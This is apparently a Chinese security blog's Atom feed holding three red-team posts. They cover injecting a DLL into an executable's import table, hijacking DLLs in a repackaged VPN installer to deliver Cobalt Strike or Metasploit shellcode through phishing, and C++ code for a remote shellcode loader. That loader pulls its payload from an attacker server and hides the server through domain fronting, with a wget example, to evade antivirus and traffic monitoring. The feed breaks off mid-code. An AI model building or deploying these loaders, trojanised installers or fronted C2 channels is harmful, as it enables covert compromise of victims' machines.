<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Uknow - Stay hungry Stay foolish</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://uknowsec.cn/"/>
  <updated>2020-06-12T19:06:40.838Z</updated>
  <id>https://uknowsec.cn/</id>
  
  <author>
    <name>uknow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>输入表注入</title>
    <link href="https://uknowsec.cn/posts/notes/%E8%BE%93%E5%85%A5%E8%A1%A8%E6%B3%A8%E5%85%A5.html"/>
    <id>https://uknowsec.cn/posts/notes/输入表注入.html</id>
    <published>2020-06-12T19:17:17.000Z</published>
    <updated>2020-06-12T19:06:40.838Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>​      上篇没有讲拿破轮胎大佬工具的原理，同时工具生成的DLL目前不是免杀的。所以这里讲一下工具的原理。实际上，注入工具会将输入的shellcode进行一个处理，然后将他写入到和<code>conf.inf</code>文件中，然后<code>wwwcomw.dll</code>可以看成一个shellcode加载器，这里就是分离免杀的原理。工具还帮我完成了修改输入表的步骤。然后我们只需要把<code>wwwcomw.dll</code>和<code>conf.inf</code>放置到exe运行目录即可。</p><h3><span id="输入表注入原理">输入表注入原理</span></h3><p>​      当Exe被加载时，系统会根据Exe输入表信息来加载需要用到的DLL,输入表注入的原理就是修改exe输入表，将自己的DLL添加到exe的导入表中，这样exe运行时可以将自己的DLL加载到exe的进程空间。</p><h3><span id="输入表注入">输入表注入</span></h3><p>DLL实例源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">HANDLE My_hThread = NULL;</span><br><span class="line"></span><br><span class="line">DWORD  WINAPI  ceshi(LPVOID pParameter)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(NULL, L&quot;Zero Team&quot;, L&quot;Zero team&quot;, MB_OK);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        My_hThread = ::CreateThread(NULL, 0, &amp;ceshi, 0, 0, 0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern&quot;C&quot; _declspec(dllexport) void test()</span><br><span class="line">&#123;</span><br><span class="line">    int a;</span><br><span class="line">    a = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译如上代码，得到dll文件。</p><p>使用LordPe查看输出表，可以看到我们写的test函数。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591938826964.png" alt="1591938826964"></p><p>使用Stud_PE添加输入表，导入exe查看函数。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591939030535.png" alt="1591939030535"></p><p>添加新的输入表，选择DLL，选择函数，加入清单。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591939139072.png" alt="1591939139072"></p><p>将DLL放置到exe运行目录，运行exe。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591939196925.png" alt="1591939196925"></p><h3><span id="结语">结语</span></h3><p>​        对于该技术的研究仅限于在渗透测试或者钓鱼中的使用，所以没有太多的逆向原理知识部分。关于其他逆向原理知识和DLL处理方面，有兴趣的可以自己研究~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;​      上篇没有讲拿破轮胎大佬工具的原理，同时工具生成的DLL目前不是免杀的。所以这里讲一下工具的原理。实际上，注入工具会将输入的shellcode进行一个处理，然后将他写入到和&lt;code&gt;conf.in
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>DLL劫持+重新制作安装包在钓鱼与反钓鱼的利用</title>
    <link href="https://uknowsec.cn/posts/notes/DLL%E5%8A%AB%E6%8C%81+%E9%87%8D%E6%96%B0%E5%88%B6%E4%BD%9C%E5%AE%89%E8%A3%85%E5%8C%85%E5%9C%A8%E9%92%93%E9%B1%BC%E4%B8%8E%E5%8F%8D%E9%92%93%E9%B1%BC%E7%9A%84%E5%88%A9%E7%94%A8.html"/>
    <id>https://uknowsec.cn/posts/notes/DLL劫持+重新制作安装包在钓鱼与反钓鱼的利用.html</id>
    <published>2020-06-11T14:17:17.000Z</published>
    <updated>2020-06-11T10:19:09.322Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>在红队工作中，社工钓鱼会是最常见的攻击手段，同样蓝队工作中，蓝队可以通过反制红队获取加分。所以本文就简单说DLL劫持+重制安装包在钓鱼与反钓鱼中的利用。</p><h3><span id="钓鱼中的利用">钓鱼中的利用</span></h3><p>在钓鱼攻击中，我们可以使用这种DLL劫持+重制安装包的方法来进行钓鱼是非常有效的。我们可以通过一些软件更新等说辞去下发恶意的安装包，恶意的安装包的安装过程逼真，同时程序正常功能都可以完美的运行。更不会使目标怀疑。</p><h3><span id="反钓鱼中的利用">反钓鱼中的利用</span></h3><p>在蓝队可以利用此方法来反制红队，例如：我们可以在自己准备好的虚拟机中点击红队发送过来的钓鱼邮件。并在虚拟机中准备一些让红队比较感兴趣的东西。</p><p>例如下图中的已准备好的“VPN安装包“+“VPN账号密码”。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591860417627.png" alt="1591860417627"></p><p>当红队队员将这些安装包和账号密码传回自己本地进行安装并运行时，我们就可以成功的反控红队队员的机器了。</p><h3><span id="dll劫持重制安装包具体操作">DLL劫持+重制安装包具体操作</span></h3><h4><span id="dll劫持">DLL劫持</span></h4><p>这里可以用到拿破轮胎大佬写DLL注入工具</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591857292811.png" alt="1591857292811"></p><p>使用方法：</p><ol><li>输入cs或者msf生成shellcode生成免杀dll文件</li><li>添加需要劫持的软件或者dll</li><li>劫持过后会在运行目录生成一个Dll和inf配置文件</li><li>需要把两个文件放在被劫持的软件同目录下才可运行</li></ol><p>这里以某国产VPN为例：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591857458850.png" alt="1591857458850"></p><p>注入后，将wwwcomw.dll和conf.inf放到软件同目录下。</p><p>当运行软件时就能上线了。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591857775627.png" alt="1591857775627"></p><h4><span id="重新制作安装包">重新制作安装包</span></h4><p>这里用到的工具是NSIS。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591858513031.png" alt="1591858513031"></p><p>制作过程就不写了，有兴趣的可以去百度找找使用说明。</p><p><a href="https://www.cnblogs.com/modou/p/3573772.html" target="_blank" rel="noopener">https://www.cnblogs.com/modou/p/3573772.html</a></p><p>成功打包</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591859259316.png" alt="1591859259316"></p><p>安装包制作效果</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591861324722.png" alt="1591861324722"></p><p>安装过程效果：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591861332658.png" alt="1591861332658"></p><p>安装完成后，可自动运行，并创建桌面快捷方式。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591861356475.png" alt="1591861356475"></p><p>运行后，成功上线</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591861391762.png" alt="1591861391762"></p><h3><span id="总结">总结</span></h3><p>本文只是简单说下DLL劫持+重制安装包在钓鱼和反钓鱼中的利用，文中的工具和DLL可能存在不免杀和实战中的更多细节内容可自行解决~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;在红队工作中，社工钓鱼会是最常见的攻击手段，同样蓝队工作中，蓝队可以通过反制红队获取加分。所以本文就简单说DLL劫持+重制安装包在钓鱼与反钓鱼中的利用。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;钓鱼中的利用&quot;&gt;钓鱼
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>ShellCode远程加载器改造计划</title>
    <link href="https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html"/>
    <id>https://uknowsec.cn/posts/notes/ShellCode远程加载器改造计划.html</id>
    <published>2020-06-01T14:17:17.000Z</published>
    <updated>2020-06-10T15:13:06.761Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>shellcode加载器加载shellcode实现免杀上线，目前可能是使用最多的方法了。</p><p>现有的加载器也特别多，但是改造轮子的心总是在骚动，所以就开始了Shellcode远程加载器改造计划。</p><h3><span id="winhttp实现http请求">Winhttp实现HTTP请求</span></h3><p>所谓远程加载shellcode，第一部得实现远程的功能，这里用Winhttp实现http请求来获取我们文件服务器上的shellcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetShellcodeByDefault</span><span class="params">(<span class="built_in">string</span> strUrl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> strHost = GetHost(strUrl);<span class="comment">//获取Host</span></span><br><span class="line">    <span class="built_in">string</span> strRequestStr = GetRequestStr(strUrl);<span class="comment">//获取请求路径</span></span><br><span class="line">    <span class="built_in">string</span> header = <span class="string">"Content-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n"</span>;</span><br><span class="line">    USES_CONVERSION;</span><br><span class="line">    LPCWSTR host = A2CW(strHost.c_str());</span><br><span class="line">    LPCWSTR requestStr = A2CW(strRequestStr.c_str());</span><br><span class="line">    <span class="comment">//Variables</span></span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    LPSTR pszOutBuffer;</span><br><span class="line">    <span class="built_in">vector</span> &lt;<span class="built_in">string</span>&gt;  vFileContent;</span><br><span class="line">    BOOL  bResults = FALSE;</span><br><span class="line"></span><br><span class="line">    HINTERNET  hSession = <span class="literal">NULL</span>,</span><br><span class="line">        hConnect = <span class="literal">NULL</span>,</span><br><span class="line">        hRequest = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">string</span> strHtml = <span class="string">""</span>;<span class="comment">// store the html code</span></span><br><span class="line">    hSession = WinHttpOpen(<span class="string">L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400"</span>,</span><br><span class="line">        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">        WINHTTP_NO_PROXY_NAME,</span><br><span class="line">        WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Specify an HTTP server.</span></span><br><span class="line">    <span class="keyword">if</span> (hSession)</span><br><span class="line">        hConnect = WinHttpConnect(hSession, host,</span><br><span class="line">            INTERNET_DEFAULT_HTTP_PORT, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Create an HTTP request handle.</span></span><br><span class="line">    <span class="keyword">if</span> (hConnect)</span><br><span class="line">        hRequest = WinHttpOpenRequest(hConnect, <span class="string">L"GET"</span>, requestStr,</span><br><span class="line">            <span class="literal">NULL</span>, WINHTTP_NO_REFERER,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Add HTTP header </span></span><br><span class="line">    LPCWSTR header1 = A2CW(header.c_str());</span><br><span class="line">    SIZE_T len = lstrlenW(header1);</span><br><span class="line">    WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send a request.</span></span><br><span class="line">    <span class="keyword">if</span> (hRequest)</span><br><span class="line">        bResults = WinHttpSendRequest(hRequest,</span><br><span class="line">            WINHTTP_NO_ADDITIONAL_HEADERS,</span><br><span class="line">            <span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// End the request.</span></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">        bResults = WinHttpReceiveResponse(hRequest, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//obtain the html source code</span></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Check for available data.</span></span><br><span class="line">            dwSize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Error %u in WinHttpQueryDataAvailable.\n"</span>,</span><br><span class="line">                    GetLastError());</span><br><span class="line">            <span class="comment">// Allocate space for the buffer.</span></span><br><span class="line">            pszOutBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Out of memory\n"</span>);</span><br><span class="line">                dwSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Read the Data.</span></span><br><span class="line">                ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,</span><br><span class="line">                    dwSize, &amp;dwDownloaded))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"Error %u in WinHttpReadData.\n"</span>,</span><br><span class="line">                        GetLastError());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//printf("%s", pszOutBuffer);</span></span><br><span class="line">                   <span class="comment">// Data in vFileContent</span></span><br><span class="line">                    vFileContent.push_back(pszOutBuffer);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Free the memory allocated to the buffer.</span></span><br><span class="line">                <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// Keep checking for data until there is nothing left.</span></span><br><span class="line">       <span class="comment">// Report any errors.</span></span><br><span class="line">        <span class="keyword">if</span> (!bResults)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Error %d has occurred.\n"</span>, GetLastError());</span><br><span class="line">        <span class="comment">// Close any open handles.</span></span><br><span class="line">        <span class="keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">        <span class="keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">        <span class="keyword">if</span> (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)vFileContent.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            str = vFileContent[i];</span><br><span class="line">            strHtml += vFileContent[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> strHtml;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码让已有的加载器实现一个远程加载shellcode的功能。</p><h3><span id="domainfronting">DomainFronting</span></h3><p>但是远程加载shellcode容易暴露自己的文件服务器地址，所以这里用到了域前置，可以用来隐藏自己的服务器地址。</p><p><a href="https://dcdn.console.aliyun.com/domain/list" target="_blank" rel="noopener">https://dcdn.console.aliyun.com/domain/list</a></p><p>申请你要加速的域名，例如<code>test.com</code>和源站信息。</p><p>申请完后就可以通过他给你分配cdn地址加上你<code>host: test.com</code>来访问的你地址了。</p><p>如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -U demo -q -O - http://test.com.w.cdngslb.com/ --header &quot;Host: test.com&quot;</span><br></pre></td></tr></table></figure><p>通过域前置的方法可以有效的隐藏我们C2地址或加载器的文件服务器。同时此类CDN地址可能存在于白名单，可用于绕过流量监测。</p><p>这里在修改一个Winhttp实现HTTP请求方法，给它填上一个<code>host</code>头。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetShellcodeByDomainFronting</span><span class="params">(<span class="built_in">string</span> strUrl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> strHost = GetHost(strUrl);<span class="comment">//获取Host</span></span><br><span class="line">    <span class="built_in">string</span> strRequestStr = GetRequestStr(strUrl);<span class="comment">//获取请求路径</span></span><br><span class="line">    <span class="built_in">string</span> header = <span class="string">"Host: "</span> + strHost + <span class="string">"\r\nContent-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n"</span>;</span><br><span class="line">    strHost = strHost + <span class="string">".w.cdngslb.com"</span>;</span><br><span class="line">    USES_CONVERSION;</span><br><span class="line">    LPCWSTR host = A2CW(strHost.c_str());<span class="comment">//string转换为常量指针类型</span></span><br><span class="line">    LPCWSTR requestStr = A2CW(strRequestStr.c_str());</span><br><span class="line">    <span class="comment">//Variables</span></span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    LPSTR pszOutBuffer;</span><br><span class="line">    <span class="built_in">vector</span> &lt;<span class="built_in">string</span>&gt;  vFileContent;</span><br><span class="line">    BOOL  bResults = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Note the definition of HINTERNET</span></span><br><span class="line">    HINTERNET  hSession = <span class="literal">NULL</span>,</span><br><span class="line">        hConnect = <span class="literal">NULL</span>,</span><br><span class="line">        hRequest = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">string</span> strHtml = <span class="string">""</span>;<span class="comment">// store the html code</span></span><br><span class="line">    <span class="built_in">string</span> str;<span class="comment">//temporary variables</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use WinHttpOpen to obtain a session handle.</span></span><br><span class="line">    hSession = WinHttpOpen(<span class="string">L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400"</span>,</span><br><span class="line">        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">        WINHTTP_NO_PROXY_NAME,</span><br><span class="line">        WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Specify an HTTP server.</span></span><br><span class="line">    <span class="keyword">if</span> (hSession)</span><br><span class="line">        hConnect = WinHttpConnect(hSession, host,</span><br><span class="line">            INTERNET_DEFAULT_HTTP_PORT, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Create an HTTP request handle.</span></span><br><span class="line">    <span class="keyword">if</span> (hConnect)</span><br><span class="line">        hRequest = WinHttpOpenRequest(hConnect, <span class="string">L"GET"</span>, requestStr,</span><br><span class="line">            <span class="literal">NULL</span>, WINHTTP_NO_REFERER,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Add HTTP header </span></span><br><span class="line">    LPCWSTR header1 = A2CW(header.c_str());</span><br><span class="line">    SIZE_T len = lstrlenW(header1);</span><br><span class="line">    WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send a request.</span></span><br><span class="line">    <span class="keyword">if</span> (hRequest)</span><br><span class="line">        bResults = WinHttpSendRequest(hRequest,</span><br><span class="line">            WINHTTP_NO_ADDITIONAL_HEADERS,</span><br><span class="line">            <span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// End the request.</span></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">        bResults = WinHttpReceiveResponse(hRequest, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//obtain the html source code</span></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Check for available data.</span></span><br><span class="line">            dwSize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Error %u in WinHttpQueryDataAvailable.\n"</span>,</span><br><span class="line">                    GetLastError());</span><br><span class="line">            <span class="comment">// Allocate space for the buffer.</span></span><br><span class="line">            pszOutBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Out of memory\n"</span>);</span><br><span class="line">                dwSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Read the Data.</span></span><br><span class="line">                ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,</span><br><span class="line">                    dwSize, &amp;dwDownloaded))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"Error %u in WinHttpReadData.\n"</span>,</span><br><span class="line">                        GetLastError());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//printf("%s", pszOutBuffer);</span></span><br><span class="line">                   <span class="comment">// Data in vFileContent</span></span><br><span class="line">                    vFileContent.push_back(pszOutBuffer);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Free the memory allocated to the buffer.</span></span><br><span class="line">                <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line">            &#125;</span><br><span 